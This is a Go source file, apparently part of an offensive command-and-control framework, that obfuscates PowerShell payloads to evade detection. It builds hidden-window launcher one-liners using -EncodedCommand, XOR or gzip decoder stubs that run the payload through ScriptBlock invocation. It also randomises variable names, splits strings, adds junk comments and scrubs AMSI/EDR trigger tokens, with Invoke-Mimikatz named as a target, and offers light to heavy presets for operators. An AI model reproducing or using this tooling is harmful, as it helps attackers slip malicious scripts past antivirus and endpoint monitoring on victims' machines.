package obfuscation

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"regexp"
	"strings"
)

// PSObfuscateOptions controls the PowerShell source/launcher obfuscation
// pipeline. All fields are optional; zero value yields the legacy behavior
// (plain UTF-8 base64 inside [ScriptBlock]::Create), which keeps
// GenerateCommandLineOneLiner backward compatible.
type PSObfuscateOptions struct {
	// Launcher selects the outer one-liner shape:
	//  "" or "scriptblock" -> powershell ... ([ScriptBlock]::Create(...)).Invoke()
	//  "encodedcommand"     -> powershell -enc <utf16le-base64> (no ScriptBlock string)
	//  "xor"                -> base64(XOR(code)) + inline -bxor decoder stub
	//  "gzip"               -> base64(gzip(code)) + inline IO.Compression decoder stub
	Launcher string

	// Source-level transforms applied before encoding (semantics-preserving):
	CaseRandomize bool // randomize case of safe keywords/cmdlets (PS is case-insensitive there)
	VarRename     bool // rename $variables consistently (skips automatics)
	StringSplit   bool // 'abc' -> ('a'+'b'+'c') for short literals
	JunkComments  bool // prepend random '#' junk lines + blank-line noise
	ScrubTriggers bool // break up known AMSI/EDR trigger tokens via concatenation

	// Seed makes the randomized transforms deterministic (tests/repro).
	// Zero means crypto/rand.
	Seed int64
	// SeedSet marks Seed as intentional (so Seed==0 is still deterministic).
	SeedSet bool
}

// ObfuscatePowerShellSource applies semantics-preserving source transforms
// and returns the transformed script. It never changes execution semantics:
// variable renames are consistent, string splits use '+', keyword casing is
// safe in PowerShell, trigger scrubbing uses string concatenation.
func ObfuscatePowerShellSource(code string, opts PSObfuscateOptions) string {
	out := code
	if opts.ScrubTriggers {
		// Safe replacement: the global ReplaceAll produced parse errors for
		// Invoke-Mimikatz and unterminated strings for quoted occurrences.
		out = scrubTriggersSafe(out, newRand(opts))
	}
	if opts.VarRename {
		// Quote-aware: renaming "$x" inside a single-quoted literal changes the
		// payload's behaviour, because PowerShell does not expand variables there.
		out = renameVariablesOutsideSingleQuotes(out, newRand(opts))
	}
	if opts.StringSplit {
		out = splitStrings(out, newRand(opts))
	}
	if opts.CaseRandomize {
		out = randomizeKeywordCase(out, newRand(opts))
	}
	if opts.JunkComments {
		out = prependJunk(out, newRand(opts))
	}
	return out
}

// GenerateCommandLineOneLinerWithOptions builds the outer cmd/powershell
// one-liner using the requested launcher. Source transforms from opts are
// applied first.
func GenerateCommandLineOneLinerWithOptions(code string, opts PSObfuscateOptions) string {
	src := ObfuscatePowerShellSource(code, opts)
	switch strings.ToLower(strings.TrimSpace(opts.Launcher)) {
	case "encodedcommand", "enc", "-enc":
		// -EncodedCommand expects UTF-16LE base64. No ScriptBlock string at
		// all, which removes the strongest static signature.
		u16 := utf16LE(src)
		b64 := base64.StdEncoding.EncodeToString(u16)
		launcher := randomizeLauncher("powershell", opts)
		return fmt.Sprintf(`%s -nop -w hidden -enc %s`, launcher, b64)
	case "xor":
		key := xorKey(opts)
		xored := xorBytes([]byte(src), key)
		b64 := base64.StdEncoding.EncodeToString(xored)
		launcher := randomizeLauncher("powershell", opts)
		// Inline decoder: FromBase64String -> -bxor each byte -> ScriptBlock.
		return fmt.Sprintf(`%s -nop -w hidden -c $k=0x%02x;$b=[System.Convert]::FromBase64String('%s');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString($b))).Invoke()`,
			launcher, key, b64)
	case "gzip":
		var buf bytes.Buffer
		gz := gzip.NewWriter(&buf)
		_, _ = gz.Write([]byte(src))
		_ = gz.Close()
		b64 := base64.StdEncoding.EncodeToString(buf.Bytes())
		launcher := randomizeLauncher("powershell", opts)
		return fmt.Sprintf(`%s -nop -w hidden -c $b=[System.Convert]::FromBase64String('%s');$ms=New-Object System.IO.MemoryStream(,$b);$gz=New-Object System.IO.Compression.GzipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($gz);([ScriptBlock]::Create($sr.ReadToEnd())).Invoke()`,
			launcher, b64)
	default: // "scriptblock" legacy
		b64 := base64.StdEncoding.EncodeToString([]byte(src))
		launcher := randomizeLauncher("powershell", opts)
		return fmt.Sprintf(`%s -nop -w hidden -c ([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')))).Invoke()`, launcher, b64)
	}
}

// DecodeOneLinerPayload moved to ps_obfuscate_test.go. It was only ever
// called from that test file, so keeping it here shipped a decoder for our
// launchers in the server binary for no benefit.

// PresetForLevel maps an operator-facing obfuscation level to pipeline
// options. "" and "none" yield the legacy behavior (plain ScriptBlock
// base64) so existing callers and stored playbooks are unaffected.
// "light" only swaps the launcher (-enc, no ScriptBlock string).
// "standard" adds an XOR layer plus trigger scrubbing and junk comments.
// "heavy" enables all source transforms on top of the XOR launcher.
func PresetForLevel(level string) PSObfuscateOptions {
	switch strings.ToLower(strings.TrimSpace(level)) {
	case "light", "low":
		return PSObfuscateOptions{Launcher: "encodedcommand"}
	case "standard", "medium", "med":
		return PSObfuscateOptions{
			Launcher: "xor", ScrubTriggers: true, JunkComments: true,
		}
	case "heavy", "high":
		return PSObfuscateOptions{
			Launcher: "xor", ScrubTriggers: true, JunkComments: true,
			VarRename: true, StringSplit: true, CaseRandomize: true,
		}
	default: // "", "none", unknown -> legacy
		return PSObfuscateOptions{}
	}
}

// --- internals ---

type jitterRand struct {
	seeded bool
	state  uint64
}

func newRand(opts PSObfuscateOptions) *jitterRand {
	if opts.SeedSet {
		return &jitterRand{seeded: true, state: uint64(opts.Seed) | 0x9e3779b97f4a7c15}
	}
	return &jitterRand{}
}

func (r *jitterRand) intn(n int) int {
	if n <= 0 {
		return 0
	}
	if r.seeded {
		// xorshift64*.
		r.state ^= r.state >> 12
		r.state ^= r.state << 25
		r.state ^= r.state >> 27
		return int((r.state * 0x2545F4914F6CDD1D) % uint64(n))
	}
	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}

func (r *jitterRand) coin(pct int) bool { return r.intn(100) < pct }

func utf16LE(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, c := range s {
		if c > 0xFFFF {
			c = '?'
		}
		out = append(out, byte(c), byte(c>>8))
	}
	return out
}

func xorBytes(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return out
}

func xorKey(opts PSObfuscateOptions) byte {
	r := newRand(opts)
	k := byte(r.intn(255) + 1) // never 0x00
	if k == 0 {
		k = 0x41
	}
	return k
}

var launcherForms = []string{"powershell", "PowerShell", "POWERSHELL", "pwsh"}

func randomizeLauncher(base string, opts PSObfuscateOptions) string {
	r := newRand(opts)
	_ = base
	// Keep "powershell" recognizable to operators but vary the spelling.
	return launcherForms[r.intn(len(launcherForms))]
}

var varRegex = regexp.MustCompile(`\$([A-Za-z_][A-Za-z0-9_?]*)`)

// automaticVariables are never renamed (would break semantics).
var automaticVariables = map[string]bool{
	"true": true, "false": true, "null": true, "_": true, "args": true,
	"input": true, "env": true, "home": true, "pshome": true, "pwd": true,
	"this": true, "psitem": true, "foreach": true, "switch": true, "error": true,
	"host": true, "profile": true, "pscommandpath": true, "psscriptroot": true,
	"lastexitcode": true, "matches": true, "myinvocation": true, "nestedpromptlevel": true,
	"psboundparameters": true, "pscmdlet": true, "psculture": true, "psdebugcontext": true,
	"pslanguageMode": true, "psversiontable": true, "pwdpath": true, "sender": true,
	"sourceargs": true, "sourceeventargs": true, "stacktrace": true,
}

const renameAlphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randName(r *jitterRand, n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = renameAlphabet[r.intn(len(renameAlphabet))]
	}
	return "$" + string(b)
}

func renameVariables(code string, r *jitterRand) string {
	mapping := map[string]string{}
	return varRegex.ReplaceAllStringFunc(code, func(m string) string {
		name := m[1:]
		lower := strings.ToLower(name)
		// $env:VAR style — keep the drive, rename nothing.
		if strings.HasSuffix(m, ":") {
			return m
		}
		if automaticVariables[lower] {
			return m
		}
		// Braced/scoped forms (${x}, $script:x, $global:x): only rename the
		// leaf when it is a plain identifier.
		if strings.Contains(name, ":") || strings.Contains(name, "{") {
			return m
		}
		if v, ok := mapping[lower]; ok {
			// Preserve original case style is unnecessary; mapping is case-insensitive.
			_ = name
			return v
		}
		v := randName(r, 6+r.intn(4))
		mapping[lower] = v
		return v
	})
}

var strLitRegex = regexp.MustCompile(`'[^'\n]{2,32}'`)

func splitStrings(code string, r *jitterRand) string {
	return strLitRegex.ReplaceAllStringFunc(code, func(m string) string {
		inner := m[1 : len(m)-1]
		// Skip things that must stay byte-exact: URLs, paths, format strings.
		if strings.Contains(inner, "://") || strings.Contains(inner, "\\") ||
			strings.Contains(inner, "{0}") || strings.Contains(inner, "%s") ||
			!r.coin(60) {
			return m
		}
		parts := make([]string, 0, len(inner))
		for _, ch := range inner {
			s := string(ch)
			if ch == '\'' {
				s = "''"
			}
			parts = append(parts, "'"+s+"'")
		}
		return "(" + strings.Join(parts, "+") + ")"
	})
}

// safeKeywords are PowerShell keywords/cmdlets safe to case-randomize
// (the language is case-insensitive for them, and they never appear as
// case-sensitive .NET member names in the matched lowercase form below).
var safeKeywords = []string{
	"function", "param", "if", "else", "elseif", "foreach", "for", "while",
	"do", "until", "switch", "return", "break", "continue", "try", "catch",
	"finally", "throw", "in", "new-object", "add-type", "iex", "write-host",
	"start-sleep", "get-process", "where-object",
}

func randomizeKeywordCase(code string, r *jitterRand) string {
	out := code
	for _, kw := range safeKeywords {
		re := regexp.MustCompile(`(?i)\b` + regexp.QuoteMeta(kw) + `\b`)
		out = re.ReplaceAllStringFunc(out, func(m string) string {
			b := []byte(m)
			for i := range b {
				if r.coin(50) {
					if b[i] >= 'a' && b[i] <= 'z' {
						b[i] -= 32
					} else if b[i] >= 'A' && b[i] <= 'Z' {
						b[i] += 32
					}
				}
			}
			return string(b)
		})
	}
	return out
}

func prependJunk(code string, r *jitterRand) string {
	n := 1 + r.intn(3)
	var b strings.Builder
	words := []string{"init", "config", "helper", "compat", "telemetry", "locale", "policy"}
	for i := 0; i < n; i++ {
		b.WriteString(fmt.Sprintf("# %s-%s %d\n",
			words[r.intn(len(words))], randAlpha(r, 6), r.intn(100000)))
	}
	if r.coin(50) {
		b.WriteString("\n")
	}
	b.WriteString(code)
	return b.String()
}

func randAlpha(r *jitterRand, n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[r.intn(len(letters))]
	}
	return string(b)
}
